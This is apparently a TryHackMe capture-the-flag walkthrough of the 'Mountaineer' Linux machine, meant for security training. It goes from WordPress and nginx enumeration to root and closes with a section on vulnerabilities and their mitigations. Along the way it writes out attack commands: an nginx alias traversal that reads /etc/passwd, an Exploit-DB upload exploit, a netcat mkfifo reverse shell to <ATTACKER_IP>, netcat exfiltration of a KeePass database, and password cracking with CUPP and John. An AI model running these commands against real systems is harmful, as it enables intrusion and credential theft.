# Mountaineer CTF Walkthrough

**Target:** Mountaineer  
**Platform:** [TryHackMe](https://tryhackme.com/room/mountaineerlinux)  
**Difficulty:** Hard  
**Target IP:** `10.80.158.179`  
**Objective:** Retrieve `local.txt` and `root.txt`.

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [WordPress Discovery & Enumeration](#wordpress-discovery--enumeration)
- [Unauthenticated SQL Injection — Admin Hash Disclosure (Dead End)](#unauthenticated-sql-injection--admin-hash-disclosure-dead-end)
- [Nginx Alias Path Traversal (LFI)](#nginx-alias-path-traversal-lfi)
- [Virtual Host Discovery & Email Enumeration](#virtual-host-discovery--email-enumeration)
- [WordPress Authenticated RCE](#wordpress-authenticated-rce)
- [KeePass Database Discovery](#keepass-database-discovery)
- [Cracking the KeePass Database](#cracking-the-keepass-database)
- [Lateral Movement to kangchenjunga](#lateral-movement-to-kangchenjunga)
- [Root Access via Bash History](#root-access-via-bash-history)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Mountaineer is a hard-difficulty Linux machine running Nginx and WordPress.
Enumeration turns up a vulnerable Modern Events Calendar Lite plugin, and
the first exploitation attempt against it — an unauthenticated SQL
injection that dumps the WordPress admin's password hash via a Metasploit
auxiliary module — turns out to be a dead end once the hash resists
cracking with `rockyou.txt`. That failure is what sends the attack in a
different direction: researching the nginx off-by-slash bug, which
uncovers an `alias` misconfiguration allowing local file disclosure.
Reading the leaked Nginx configuration exposes a second virtual host
running Roundcube webmail. Weak, reused credentials (`k2:k2`) unlock that
mailbox, and an email inside it supplies the password needed to
successfully exploit the plugin's *other* vulnerability — an authenticated
arbitrary file upload — for code execution as `www-data`.

Local enumeration then reveals a KeePass database belonging to another
user. After extracting the database and generating a targeted wordlist
with CUPP, its master password can be cracked with John the Ripper.
Credentials stored in KeePass allow movement to `kangchenjunga`, where the
local flag is found. Finally, a plaintext root password left in the
user's Bash history provides root access.

**Key skills demonstrated:**

- Network and web enumeration (`nmap`, `gobuster`)
- WordPress fingerprinting and user enumeration (`wpscan`)
- Recognizing a dead end and pivoting (Metasploit SQLi → failed crack → LFI research)
- Nginx alias traversal and local file disclosure
- Virtual host discovery
- Email and credential enumeration
- Exploiting an authenticated WordPress plugin vulnerability
- Reverse shell handling
- KeePass database extraction and cracking (`keepass2john`, `john`, `kpcli`)
- Targeted wordlist generation (`cupp`)
- Linux lateral movement and credential discovery

---

## Reconnaissance

### Initial Web Check

The web server initially displays the default Nginx landing page:

```bash
curl http://10.80.158.179
```

This confirms that an HTTP service is available, but does not reveal the
actual application.

### Port Scanning

A full TCP port scan with service and OS detection identifies two open
ports:

```bash
nmap -sVC -O -p- 10.80.158.179
```

**Relevant results:**

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 |
| 80/tcp | HTTP | Nginx 1.18.0 (Ubuntu) |

The scan identifies Linux as the target operating system. Since HTTP is
the only exposed web service, the next step is to enumerate the web root.

### Directory Enumeration

Gobuster discovers a WordPress directory:

```bash
gobuster dir -u http://10.80.158.179 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -t 45
```

```text
wordpress            (Status: 301) [--> http://10.80.158.179/wordpress/]
```

---

## WordPress Discovery & Enumeration

Opening `/wordpress/` reveals that the site does not render correctly.
Inspecting the page source shows that WordPress references a hostname
rather than the target IP:

```html
<link rel="alternate" type="application/rss+xml"
title="Mountaineer » Feed"
href="http://mountaineer.thm/wordpress/?feed=rss2" />
```

Add the hostname to the local hosts file:

```bash
sudo nano /etc/hosts
```

Add:

```text
10.80.158.179 mountaineer.thm
```

Run directory enumeration again using the hostname:

```bash
gobuster dir -u http://mountaineer.thm/wordpress \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -t 45
```

The scan identifies common WordPress directories, including:

```text
images
wp-content
wp-includes
wp-admin
```

### WordPress Fingerprinting

WPScan identifies the WordPress installation, its users, and installed
plugins:

```bash
wpscan --url http://mountaineer.thm/wordpress/ -e u,ap
```

Notable findings include:

- WordPress version: `6.4.3`
- Theme: `blogarise`
- XML-RPC appears to be enabled.
- The WordPress readme file is accessible.
- Several usernames are disclosed.

**Enumerated usernames:**

```text
admin
ChoOyu
chooyu
k2
MontBlanc
montblanc
everest
Everest
```

To obtain vulnerability information for plugins and themes, WPScan needs
an API token:

```bash
wpscan --url http://mountaineer.thm/wordpress/ \
  -e vp --api-token YOUR_WPSCAN_API_TOKEN
```

The scan identifies two plugins of interest:

| Plugin | Detected version |
|---|---:|
| Modern Events Calendar Lite | 5.16.2 |
| User Role Editor | 4.64.2 |

Modern Events Calendar Lite 5.16.2 stands out immediately — WPScan flags
it with 25 known vulnerabilities, including two that matter here:

- **CVE-2021-24149** — unauthenticated SQL injection
- **CVE-2021-24145** — authenticated arbitrary file upload leading to RCE

```bash
searchsploit modern event calendar 5.16
```

```text
Wordpress Plugin Modern Events Calendar 5.16.2 - Event export (Unauthenticated SQLi) | php/webapps/50084.py
Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated) | php/webapps/50082.py
```

Two separate routes present themselves. The unauthenticated SQLi looks
like the faster win, since it needs no credentials at all — that's
investigated first.

---

## Unauthenticated SQL Injection — Admin Hash Disclosure (Dead End)

Metasploit ships a dedicated scanner for the same vulnerability class:

```bash
msfconsole -q
msf > search modern event
```

```text
1  auxiliary/scanner/http/wp_modern_events_calendar_sqli   normal  Yes  WordPress Modern Events Calendar SQLi Scanner
2  exploit/multi/http/wp_plugin_modern_events_calendar_rce excellent Yes WordPress Plugin Modern Events Calendar - Authenticated Remote Code Execution
```

The unauthenticated scanner is run against the target:

```text
msf > use 1
msf auxiliary(scanner/http/wp_modern_events_calendar_sqli) > set rhosts mountaineer.thm
msf auxiliary(scanner/http/wp_modern_events_calendar_sqli) > set targeturi /wordpress/
msf auxiliary(scanner/http/wp_modern_events_calendar_sqli) > run
```

```text
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BV.Ti3d.cRhWdsEkDtiloJB9JGxEPG0
```

This confirms the SQLi is real and unauthenticated: it hands back the
admin account's `phpass` hash with no credentials required. The hash is
fed to John the Ripper against `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=phpass
```

```text
0g 0:00:06:22 DONE (2026-11-12 15:52) 0g/s 37467p/s
```

**0 passwords cracked.** `rockyou.txt` doesn't contain the admin
password, and with no further leads on this hash, this path is
abandoned. The vulnerability is real and the hash disclosure is a genuine
finding, but it doesn't convert into access on its own — attention shifts
to the other lead from the plugin enumeration step: the nginx
off-by-slash bug.

---

## Nginx Alias Path Traversal (LFI)

With the SQLi path stalled, research turns to how the web server handles
the `/wordpress/images` path — a known nginx misconfiguration pattern
(the "off-by-slash" `alias` bug) comes to mind.

A request using `images../` allows access to files outside the intended
directory:

```bash
curl http://mountaineer.thm/wordpress/images../etc/passwd
```

The response contains `/etc/passwd`, including local account names such
as:

```text
www-data
vagrant
kangchenjunga
everest
lhotse
nanga
k2
```

This confirms the lead: the issue is not simply directory enumeration —
the Nginx alias configuration permits local file disclosure.

### Reading the Nginx Configuration

The same traversal can be used to retrieve the active site's Nginx
configuration:

```bash
curl http://mountaineer.thm/wordpress/images../etc/nginx/sites-available/default
```

The relevant configuration is:

```nginx
server_name mountaineer.thm adminroundcubemail.mountaineer.thm;

location /wordpress/images {
    alias /media/;
}
```

Two useful details stand out:

1. The `alias` directive explains the path traversal.
2. The `server_name` directive reveals another virtual host:

   `adminroundcubemail.mountaineer.thm`

The second hostname suggests that another web application is hosted on
the same machine.

---

## Virtual Host Discovery & Email Enumeration

Add the newly discovered virtual host to `/etc/hosts`:

```text
10.80.158.179 mountaineer.thm adminroundcubemail.mountaineer.thm
```

Browse to:

```text
http://adminroundcubemail.mountaineer.thm/
```

A Roundcube webmail login page is available.

### Accessing the Mailbox

Rather than brute forcing, the enumerated usernames are each tried as
their own password — a quick, low-effort check for exactly this kind of
weak-credential setup. It succeeds for `k2`:

```text
Username: k2
Password: k2
```

After logging in, an email from `nanga` contains a password:

```text
From: nanga <nanga@localhost>

Hi You!

You know that you are the prettiest mountain out there, right?
For me, you are also the tallest one!
I've got the perfect password for the perfect mountain:

th3_tall3st_password_in_th3_world

See you soon!

nanga
```

This is a useful example of why email services should be included in the
enumeration process: an additional virtual host can expose information
that is not available through the main website.

---

## WordPress Authenticated RCE

The earlier WPScan results identified Modern Events Calendar Lite version
`5.16.2`, and the second CVE from that finding — CVE-2021-24145,
authenticated arbitrary file upload — is now attempted using the
credentials recovered from the mailbox.

Copy the exploit locally:

```bash
searchsploit -m 50082.py
```

The exploit is run with username `k2` and the password sent by `nanga`:

```bash
python 50082.py -T mountaineer.thm -P 80 \
  -U /wordpress/ -u k2 -p 'th3_tall3st_password_in_th3_world'
```

**Credential note:** the email is explicitly signed by `nanga` and the
password appears inside it addressed to the recipient, but the WordPress
account that password actually unlocks is `k2`'s — not a `nanga` account.
Read literally, `nanga` sent `k2` a password for `k2`'s own account. This
pairing is unintuitive enough that it's worth rechecking against your own
exploit run before publishing, rather than assuming the password belongs
to whichever name is attached to the email.

The exploit reports successful authentication and uploads a PHP shell:

```text
[+] Authentication successfull !

[+] Shell Uploaded to:
http://mountaineer.thm/wordpress/wp-content/uploads/shell.php
```

Opening the uploaded shell provides command execution as:

```bash
whoami
```

```text
www-data
```

**Initial foothold:** `www-data`

### Upgrading to a Reverse Shell

A reverse shell makes local enumeration easier.

Start a listener on the attacker machine:

```bash
rlwrap nc -nvlp 9013
```

Execute the following from the uploaded PHP shell, replacing the address
and port with your listener details:

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> 9013 > /tmp/f
```

After the connection arrives, upgrade to a more usable Bash shell:

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Confirm the current account:

```bash
whoami
id
```

The shell runs as `www-data`.

---

## KeePass Database Discovery

With a shell as `www-data`, enumerate local users and their home
directories:

```bash
cd /home
ls -la
```

The home directories include:

```text
annapurna
everest
k2
kangchenjunga
lhotse
makalu
manaslu
nanga
vagrant
```

The `lhotse` home directory contains a KeePass database:

```bash
ls -l /home/lhotse
```

```text
-rwxrwxrwx 1 lhotse lhotse 2302 Apr  6 2024 Backup.kdbx
```

The file permissions are noteworthy: `Backup.kdbx` is world-readable and
world-writable (`777`). This allows the current low-privileged account to
access and copy the database.

### Copying the Database to the Attacker Machine

On the attacker machine, start a listener that writes received data to a
file:

```bash
nc -lvnp 9012 > Backup.kdbx
```

On the target, send the database:

```bash
nc <ATTACKER_IP> 9012 < /home/lhotse/Backup.kdbx
```

Verify the downloaded file:

```bash
file Backup.kdbx
```

```text
Backup.kdbx: Keepass password database 2.x KDBX
```

---

## Cracking the KeePass Database

### Extracting the Hash

Use `keepass2john` to convert the database into a hash format suitable
for John the Ripper:

```bash
keepass2john Backup.kdbx > backup.txt
```

The initial attempt with a common wordlist such as `rockyou.txt` did not
recover the master password.

### Finding Password Hints

Further enumeration of the `k2` account reveals that the same `k2:k2`
credential pair recovered from Roundcube also works as the OS-level
login — a direct instance of password reuse between the web application
and the underlying Linux account:

```bash
su k2
```

```text
Password: k2
```

Inspect the mailbox:

```bash
cd /home/k2/mail
cat Sent
```

The email contains personal information about Lhotse:

```text
First Name: Mount
Surname: Lhotse
Nickname: MrSecurity
Birthdate: May 18, 1956
Pet's Name: Lhotsy
Company Name: BestMountainsInc
```

These details can be used to create a targeted wordlist.

### Generating a Targeted Wordlist with CUPP

CUPP (Common User Passwords Profiler) generates password candidates based
on information about a target.

Clone the project:

```bash
git clone https://github.com/Mebus/cupp.git
cd cupp
```

Run interactive mode:

```bash
python cupp.py -i
```

Enter the information discovered in the email (the birthdate must be
entered as 8 digits, `DDMMYYYY`):

| Prompt | Value |
|---|---|
| First name | `Mount` |
| Surname | `Lhotse` |
| Nickname | `MrSecurity` |
| Birthdate | `18051956` |
| Pet's name | `Lhotsy` |
| Company name | `BestMountainsInc` |

Leave unknown fields blank. CUPP generates a custom wordlist named
`mount.txt`.

### Cracking the Hash

Run John the Ripper against the generated list:

```bash
john --wordlist=mount.txt backup.txt
```

The password is recovered:

```text
Lhotse56185 (Backup)
```

The KeePass credentials are therefore:

```text
Database: Backup.kdbx
Master password: Lhotse56185
```

### Inspecting the KeePass Database

Open the database with `kpcli`:

```bash
kpcli --kdb=Backup.kdbx
```

List the available groups:

```text
kpcli:/> ls

=== Groups ===
wordpress-backup/
```

Navigate into the group:

```text
kpcli:/> cd wordpress-backup/
kpcli:/wordpress-backup> ls
```

The group contains several subgroups and entries. One entry is
particularly interesting:

```text
3. The "Security-Mindedness" mountain
```

Display it:

```text
kpcli:/wordpress-backup> show -f 3
```

```text
Title: The "Security-Mindedness" mountain
Uname: kangchenjunga
Pass: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
```

This provides credentials for another local account.

---

## Lateral Movement to kangchenjunga

Use the recovered KeePass credentials to switch users:

```bash
su kangchenjunga
```

```text
Password: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
```

Check the account and enumerate its home directory:

```bash
whoami
cd /home/kangchenjunga
ls -la
```

The home directory contains:

```text
local.txt
mynotes.txt
.bash_history
```

### Retrieving the Local Flag

```bash
cat local.txt
```

**Local flag:**

```text
97a805eb710deb97342a48092876df22
```

### Checking Sudo Permissions

Check whether the account can execute commands as root:

```bash
sudo -l
```

The result indicates that `kangchenjunga` is not permitted to run sudo
commands:

```text
Sorry, user kangchenjunga may not run sudo on mountaineer.
```

Instead of stopping here, continue enumerating files in the user's home
directory.

---

## Root Access via Bash History

The `.bash_history` file contains commands previously executed by the
user:

```bash
cat /home/kangchenjunga/.bash_history
```

Among the recorded commands is a `su` operation followed directly by a
password:

```text
suroot
th3_r00t_of_4LL_mount41NSSSSssssss
```

This exposes a plaintext root password in the user's shell history.

Switch to root:

```bash
su root
```

Enter the recovered password:

```text
th3_r00t_of_4LL_mount41NSSSSssssss
```

Verify the new identity:

```bash
whoami
```

```text
root
```

**Root access obtained.**

`/root` also contains a thematic note left by the room's creator:

```bash
cat /root/note.txt
```

```text
Dear Adventurers,

I want to express my heartfelt thanks for embarking on this incredible
journey to explore the highest mountains with us...

This machine was created while climbing ;)
```

Retrieve the root flag:

```bash
cd /root
cat root.txt
```

```text
a41824310a621855d9ed507f29eed757
```

---

## Flags

| Flag | Value |
|---|---|
| `local.txt` | `97a805eb710deb97342a48092876df22` |
| `root.txt` | `a41824310a621855d9ed507f29eed757` |

---

## Vulnerabilities

### 1. Unauthenticated SQL Injection in Modern Events Calendar Lite (Critical)

**Description:** Modern Events Calendar Lite 5.16.2 is affected by an
unauthenticated SQL injection (CVE-2021-24149). A public Metasploit
auxiliary module (`wp_modern_events_calendar_sqli`) exploits it directly
to dump WordPress user records, including password hashes, with no
authentication at all.

**Impact:** Confirmed disclosure of the `admin` account's `phpass` hash.
In this instance the hash resisted cracking against `rockyou.txt`, so it
didn't convert into access — but the disclosure itself is a full
pre-authentication information-leak vulnerability independent of that.

**Mitigation:**
- Upgrade the plugin past 5.16.6, where this issue is fixed.
- Never assume a hash disclosure is low-risk just because an initial
  crack attempt fails — rotate the exposed credential regardless.

### 2. Nginx Alias Misconfiguration — Local File Disclosure (High)

**Description:** The Nginx configuration maps `/wordpress/images` to
`/media/` using an `alias` directive. The path handling permits traversal
through a request such as `/wordpress/images../etc/passwd`.

**Impact:** An unauthenticated remote user can read files accessible to
the web server, including `/etc/passwd` and the Nginx virtual host
configuration. This reveals local usernames and additional virtual
hosts.

**Mitigation:**
- Review Nginx `location` and `alias` combinations carefully.
- Normalize and validate requested paths.
- Restrict access to sensitive filesystem locations.
- Test alias mappings for traversal paths during deployment reviews.

### 3. Exposed WordPress Information and Outdated Components (Medium)

**Description:** WordPress version information, usernames, XML-RPC, and
readme information were discoverable. The installed Modern Events
Calendar Lite plugin was version `5.16.2`, vulnerable to both of the
issues above.

**Impact:** The disclosed application details help an attacker identify
vulnerable components and prepare an attack.

**Mitigation:**
- Keep WordPress core, themes, and plugins updated.
- Remove unnecessary version and readme disclosures.
- Disable XML-RPC if it is not required.
- Regularly audit installed plugins and remove unused components.

### 4. Weak, Reused Credentials Across Web Mail and the OS Account (High)

**Description:** The user `k2` used the same trivial credential pair
(`k2:k2`) for both the Roundcube webmail login and the underlying Linux
account. The password was effectively guessable on sight — the username
tried as its own password — and once found, it granted access to two
separate systems instead of one.

**Impact:** A single weak password compromised both the mailbox (which
then leaked further credentials via email) and direct OS-level shell
access (`su k2`) once a foothold existed.

**Mitigation:**
- Enforce unique, strong passwords for each account and service — never
  reuse a web application password for an OS-level account.
- Use multi-factor authentication where possible.
- Apply rate limiting and monitoring to authentication endpoints.
- Avoid sending passwords in plaintext email.

### 5. Authenticated Arbitrary File Upload in Modern Events Calendar Lite (Critical)

**Description:** The same plugin is additionally affected by
CVE-2021-24145, an authenticated arbitrary file upload vulnerability.

**Impact:** Successful exploitation uploaded a PHP shell and provided
command execution as `www-data`.

**Mitigation:**
- Upgrade the plugin to a fixed version.
- Remove unused plugins and monitor plugin upload directories.
- Prevent PHP execution in directories intended for user uploads.
- Restrict WordPress administrative access and use strong authentication.

### 6. Insecure KeePass Database Permissions (High)

**Description:** `/home/lhotse/Backup.kdbx` was accessible with
permissions `777`, allowing other local users to read and modify the
database.

**Impact:** The database could be copied and its master password attacked
offline. Successful cracking exposed credentials for another local
account.

**Mitigation:**
- Restrict database permissions to the owner (for example, `600` where
  appropriate).
- Store password databases in protected directories.
- Use a strong, unique master password.
- Review backup files for excessive permissions and unintended exposure.

### 7. Sensitive Information Used to Build Passwords (Medium)

**Description:** An email contained personal details about Lhotse,
including a name, nickname, birthdate, pet name, and company name. These
details were sufficient to generate a targeted wordlist with CUPP.

**Impact:** Personal information can make password guessing significantly
more effective when users incorporate familiar details into passwords.

**Mitigation:**
- Avoid using personal information in passwords.
- Use randomly generated passwords stored in a password manager.
- Limit exposure of personal information and avoid using it as
  authentication material.

### 8. Plaintext Root Password in Bash History (Critical)

**Description:** The `.bash_history` file belonging to `kangchenjunga`
contained a root password in plaintext.

**Impact:** A user able to read the history file could recover the root
password and switch directly to the root account.

**Mitigation:**
- Never enter passwords in a way that records them in shell history.
- Restrict access to home directories and history files.
- Remove exposed credentials and rotate affected passwords.
- Consider controls that prevent sensitive commands or secrets from being
  stored in shell history.

---

## Attack Chain Summary

```text
Nmap → SSH (22) and Nginx HTTP (80)
    ↓
Gobuster → /wordpress/
    ↓
WordPress fingerprinting → WPScan → users + two plugin CVEs identified
    ↓
Metasploit wp_modern_events_calendar_sqli (unauthenticated) → admin phpass hash
    ↓
john --wordlist=rockyou.txt → crack fails (DEAD END)
    ↓
Pivot: nginx off-by-slash research → alias traversal confirmed
    ↓
/etc/passwd and Nginx configuration disclosed
    ↓
Nginx server_name → adminroundcubemail.mountaineer.thm discovered
    ↓
Roundcube: usernames tried as own passwords → k2:k2 works
    ↓
k2's mailbox → email from nanga reveals a password
    ↓
Modern Events Calendar Lite 5.16.2 → authenticated file upload RCE (k2 + recovered password)
    ↓
PHP shell → www-data reverse shell
    ↓
/home/lhotse/Backup.kdbx → database copied to attacker machine
    ↓
su k2 (k2:k2 reused) → k2 mailbox → personal details about Lhotse
    ↓
CUPP → targeted wordlist → John cracks KeePass master password
    ↓
kpcli → kangchenjunga credentials recovered
    ↓
su kangchenjunga → local.txt retrieved
    ↓
.bash_history → plaintext root password recovered
    ↓
su root → root.txt retrieved
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port scanning and service detection |
| cURL | HTTP requests and file disclosure testing |
| Gobuster | Web directory enumeration |
| WPScan | WordPress, user, and plugin enumeration |
| Searchsploit | Searching for public exploit code |
| Metasploit | Running the unauthenticated SQLi scanner (dead end — hash disclosed but not cracked) |
| Python | Running the downloaded RCE exploit |
| Netcat (`nc`) / rlwrap | File transfer and reverse shell handling |
| `keepass2john` | Extracting a KeePass hash |
| John the Ripper | Cracking the admin phpass hash (failed) and the KeePass master password (succeeded) |
| CUPP | Generating a targeted password list |
| kpcli | Inspecting the KeePass database |
| `su` | Switching between local Linux users |

---

## References

- [TryHackMe — Mountaineer](https://tryhackme.com/room/mountaineerlinux)
- [Nginx alias traversal — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/nginx.html#alias-lfi-misconfiguration)
- [Nginx Off-by-One Slash Vulnerability](https://medium.com/@_sharathc/unveiling-the-off-by-one-slash-vulnerability-in-nginx-configurations-c05b3b7b7c1e)
- [WPScan](https://wpscan.com/)
- [CVE-2021-24145](https://nvd.nist.gov/vuln/detail/CVE-2021-24145)
- [CVE-2021-24149](https://nvd.nist.gov/vuln/detail/CVE-2021-24149)
- [Exploit-DB — 50082](https://www.exploit-db.com/exploits/50082)
- [CUPP — Common User Passwords Profiler](https://github.com/Mebus/cupp)
- [KeePass2John](https://keepass2john.com/)
- [John the Ripper](https://www.openwall.com/john/)
- [kpcli — KeePass CLI](https://github.com/Rookery/kpcli)
